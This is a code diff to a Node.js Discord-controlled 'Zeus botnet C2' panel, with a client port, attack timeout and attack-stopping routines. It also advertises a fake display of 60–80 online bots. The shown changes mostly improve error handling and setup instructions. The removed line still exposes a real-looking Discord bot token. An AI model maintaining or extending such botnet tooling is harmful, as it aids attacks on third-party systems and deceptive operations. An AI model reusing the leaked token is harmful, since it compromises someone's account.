@@ -1,6 +1,9 @@
-// main.js - ZEUS BOTNET C2 PROFESSIONAL EDITION
+// bot.js - ZEUS BOTNET C2 PROFESSIONAL EDITION
 // ==============================================
 // Developed by @L1shx – All credit goes to the original author.
+//
+// IMPORTANT: This bot requires the "Message Content Intent" to be enabled
+// in the Discord Developer Portal under your bot's settings.
 //
 // Features:
 //   - Fake botnet with 60‑80 online bots, IPs change every 5‑10 minutes
@@ -13,7 +16,7 @@
 //   - Role‑based access control (optional)
 //
 // Required: npm install discord.js
-// Run with: node main.js
+// Run with: node bot.js
 // ==============================================
 
 const net = require('net');
@@ -23,7 +26,7 @@ const fs = require('fs');
 
 // ---------------------------- Configuration ---------------------------------
 const C2_PORT = 7771;                           // Port for real clients
-const DISCORD_TOKEN = 'MTQ2OTI3Mjg4MDIzNDc2MjI3Mg.GV6Vaz.jAAqYK9ZgSV5ahQfoB3ONyp2pK5QvaiTqgZNRk';  // <-- REPLACE WITH YOUR TOKEN
+const DISCORD_TOKEN = 'YOUR_DISCORD_BOT_TOKEN';  // <-- REPLACE WITH YOUR TOKEN
 const PREFIX = '!';                              // Discord command prefix
 const DATA_FILE = './botnet_data.json';          // Persistent storage file
 const ATTACK_TIMEOUT = 300;                       // Max attack duration (seconds)
@@ -297,7 +300,7 @@ const discordClient = new Client({
     intents: [
         GatewayIntentBits.Guilds,
         GatewayIntentBits.GuildMessages,
-        GatewayIntentBits.MessageContent
+        GatewayIntentBits.MessageContent // <-- This requires the Message Content Intent to be enabled in Discord Developer Portal
     ]
 });
 
@@ -576,9 +579,16 @@ discordClient.on('messageCreate', async (message) => {
 // Load initial state
 loadState();
 
-// Login to Discord
+// Login to Discord with improved error handling
 discordClient.login(DISCORD_TOKEN).catch(err => {
-    console.error('[DISCORD] Failed to login:', err);
+    console.error('[DISCORD] Failed to login:', err.message);
+    if (err.message.includes('disallowed intents')) {
+        console.error('\n❌ The bot is requesting intents that are not enabled.');
+        console.error('👉 Please go to the Discord Developer Portal, select your bot,');
+        console.error('   enable "Message Content Intent" under "Privileged Gateway Intents",');
+        console.error('   and then restart the bot.\n');
+    }
+    process.exit(1); // Exit so the user can fix the issue
 });
 
 // Graceful shutdown
@@ -590,5 +600,4 @@ process.on('SIGINT', () => {
     stopAllLocalAttacks();
     discordClient.destroy();
     process.exit();
-
 });
